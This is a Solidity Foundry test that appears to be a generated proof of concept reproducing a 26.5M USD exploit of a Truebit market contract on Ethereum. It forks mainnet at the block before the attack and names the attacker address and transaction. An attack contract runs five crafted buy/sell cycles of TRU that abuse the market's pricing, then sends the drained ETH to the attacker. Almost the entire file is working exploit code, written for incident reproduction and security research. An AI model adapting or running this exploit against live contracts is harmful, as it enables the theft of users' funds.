// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 26.51M USD
// Attacker : 0x6c8ec8f14be7c01672d31cfa5f2cefeab2562b50
// Attack Contract : 0x1de399967b206e446b4e9aeeb3cb0a0991bf11b8
// Vulnerable Contract : 0x1de399967b206e446b4e9aeeb3cb0a0991bf11b8
// Attack Tx : 0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014
// Block : 24191019
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 26.5M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 24191018;
    uint256 constant TX_TIMESTAMP = 1767888155;
    uint256 constant TX_BLOCK_NUMBER = 24191019;
    uint256 constant TX_VALUE = 10000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x64dd891a), 100000000000000000);
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AttackContract attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = AttackContract(payable(ATTACK_CONTRACT));
        } else {
            attack = new AttackContract();
        }
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.PROFIT_HOLDER, address(0), Addresses.ZERO, "ETH", 100000000000000000);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "ETH", 8535348497836391626573);
    }
}

contract AttackContract {
    ITruebitMarket private constant MARKET = ITruebitMarket(Addresses.TRUEBIT_MARKET);
    IERC20Like private constant TRU = IERC20Like(Addresses.TRU);

    struct TradeCycle {
        uint256 truAmount;
        uint256 ethValue;
    }

    function attack(uint256) external payable {
        _tradeCycle(TradeCycle(240442509453545333947284131, 0));
        _tradeCycle(TradeCycle(441010174513890026925958238, 6));
        _tradeCycle(TradeCycle(970752178501023300932298000, 319134474904345));
        _tradeCycle(TradeCycle(2808567055501947160504720479, 15168571520541215));
        _tradeCycle(TradeCycle(12548923878784675664886517494, 5114995545275641043));
        _settleProfit();
    }

    function _tradeCycle(TradeCycle memory cycle) internal {
        MARKET.getPurchasePrice(cycle.truAmount);
        MARKET.buyTRU{value: cycle.ethValue}(cycle.truAmount);
        uint256 truBalance = TRU.balanceOf(address(this));
        TRU.approve(Addresses.TRUEBIT_MARKET, cycle.truAmount);
        MARKET.sellTRU(truBalance);
    }

    function _settleProfit() internal {
        _sendEth(Addresses.PROFIT_HOLDER, 100000000000000000);
        _sendEth(Addresses.ATTACKER_EOA, 8535363576519732789359);
    }

    function _sendEth(address recipient, uint256 amount) internal {
        (bool ok,) = payable(recipient).call{value: amount}("");
        require(ok, "profit transfer failed");
    }

    receive() external payable {}

    fallback() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant ATTACK_CONTRACT = 0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8;
    address internal constant PROFIT_HOLDER = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    address internal constant ATTACKER_EOA = 0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50;
    address internal constant TRUEBIT_MARKET = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
}

interface ITruebitMarket {
    function buyTRU(uint256) external payable returns (uint256);
    function getPurchasePrice(uint256) external returns (uint256);
    function sellTRU(uint256) external returns (uint256);
}
